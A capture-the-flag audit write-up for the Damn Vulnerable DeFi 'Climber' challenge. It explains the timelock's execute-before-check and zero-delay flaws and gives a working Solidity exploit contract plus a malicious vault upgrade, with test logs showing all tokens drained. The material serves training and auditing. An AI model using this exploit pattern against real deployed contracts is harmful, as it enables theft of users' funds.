# Damn Vulnerable Defi - Climber
- Scope
    - ClimberVault.sol
    - ClimberTimelock.sol
    - ClimberTimelockBase.sol
    - ClimberConstants.sol
    - ClimberErrors.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## Various vulnerabilities in `execute()` and `updateDelay()` leading to drained tokens from vault

### Summary
Various vulnerabilities in `execute()` and `updateDelay()` can be chained to upgrade the implementation contract to a malicious one and drain the tokens from vault.

### Vulnerability Details
1. The `execute()` function executes the call first, before perforing the check. Hence, we can schedule a list of calls to be executed and as long the last call is ReadyToExecute, the tx won't revert.
2. `updateDelay()` function checks the input value wrongly, as long as it does not exceed the MAX_DELAY, you can change the delay, including setting it to 0.
```diff
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
        if (targets.length <= MIN_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length; ++i) {
-1            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
-1            revert NotReadyForExecution(id);
        }

        operations[id].executed = true;
    }
```
```diff
function updateDelay(uint64 newDelay) external {
        if (msg.sender != address(this)) {
            revert CallerNotTimelock();
        }

-2        if (newDelay > MAX_DELAY) {
            revert NewDelayAboveMax();
        }

        delay = newDelay;
    }
```

### Impact/Proof of Concept

```diff
contract Exploit {
    address payable private immutable timelock;

    uint256[] private _values = [0, 0, 0,0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        // Setup the calls to be executed, the execute() function does not check if these have been scheduled or ReadyToExecute.
        // 1. We grant this contract the PROPOSER_ROLE
        // 2. Then we remove the delay by setting it to 0
        // 3. We transfer ownership of the vault to this contract, so that we can upgrade the implementation contract
        // 4. Lastly we schedule the calls so that the final check for ReadyToExecute will not fail and we have delay already set to 0
        timelock = _timelock;
        _targets = [_timelock, _timelock, _vault, address(this)];

        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[3] = abi.encodeWithSignature("timelockSchedule()");
    }

    function timelockExecute() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("123"));
    }

    function timelockSchedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));
    }
}


// Custom upgraded implementation contract that can withdraw all tokens
contract PwnedClimberVault is ClimberVault {
/// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }
}
```

Results
```diff
[PASS] test_climber() (gas: 2439835)
Logs:
  Vault beforeBalance:  10000000000000000000000000
  Vault afterBalance:  0
  Recovery afterBalance:  10000000000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.56ms (571.29µs CPU time)
```

